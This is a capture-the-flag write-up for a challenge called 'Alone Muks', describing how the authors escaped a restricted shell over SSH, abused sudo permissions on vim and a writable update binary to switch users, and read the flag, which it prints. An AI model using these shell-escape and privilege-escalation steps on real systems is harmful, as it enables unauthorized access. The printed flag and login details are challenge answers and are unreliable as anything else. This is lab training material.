# Alone Muks

## Contexte 

> Lors de votre récent séjour à Evil Country, vous êtes parvenu à brancher un dispositif sur le camion effectuant la livraison. Il faut maintenant trouver une faille sur le système pour pouvoir prendre le contrôle du  camion autonome de la marque Lates et le rediriger vers un point  d'extraction. Un agent a posé un dispositif nous permettant d'accéder au système de divertissement du véhicule. A partir de ce dernier, remontez jusqu'au système de navigation.
>  Connectez-vous en SSH au camion

We have to pwn the truck using SSH to redirect the autonomous drive wherever we want. ( actually we only have to get a flag )

```shell
username : user
password : user
adress : challengecybersec.fr
port : 5004
```

## Breaking inside the server

When we log on the server we are prompted to another land page where we have to log-in again. But exiting the software using `^C` (CTRL + C) leaded us on a restricted bash (rbash). We were really limited in commands and permissions.

We found an executable path to python environement then we elevated ourselves permissions importing bash using python :

`python -c "import os; os.system('/bin/bash')"` 

Then we wandered on the server, looking if we could add some executables to our path, and we found the most basic ones. 
We found what we need in `/bin`, `/usr/bin`, `/sbin`

The export command to ease our navigation : 
`export PATH=$PATH:/bin:/usr/bin:/sbin`

When we digged deeper in the /usr/bin files we found out there was a file named `update`, owned by globalSystem, in the group globalSystem, so we had to find a way to become global system. 

```sh
-rwxr-xr-x 1 globalSystem globalSystem   43744 Nov 15 16:28  update
```



We also searched the `/home` paths and we listed 3 home directories :

- `/user/`
- `/globalSystem/`
- `/navigationSystem/` 

The `navigationSystem home contain the flag we need to complete the challenge.

So the actual objective is trying to understand what is the `update` executable we found. But we don't have any permissions to read it.

Speaking of permissions, we had the idea of checking all the permissions we have on the user `user`

```shell
user@b43e27468d7b:/bin$ sudo -l
Matching Defaults entries for user on b43e27468d7b: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD
User user may run the following commands on b43e27468d7b:
(globalSystem) NOPASSWD: /usr/bin/vim 
```

so we could execute vim on globalSystem using `vim`

```shell
sudo -u globalSystem vim
```

then we launch a shell using vim :

`:!bash`

We tried to execute the `update` file, and it asked for a password. The password were found in the file when we opened it : `AloneIsTheBest`. The program were on infinite loop, we had to check for another way.

We did another `sudo -l` command.

Output : 

```shell
globalSystem@b43e27468d7b:/bin$ sudo -l
Matching Defaults entries for globalSystem on b43e27468d7b:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD             
User globalSystem may run the following commands on b43e27468d7b:                                                                         (navigationSystem) NOPASSWD: /usr/bin/update
```

And then we own the update file we got the idea by replacing the whole program content. 

```shell
echo "cat /home/navigationSystem/flag.txt" > update
```

```shell
sudo -u navigationSystem update
```

the flag were in the output :

`DGSESIEE{44adfb64ff382f6433eeb03ed829afe0}`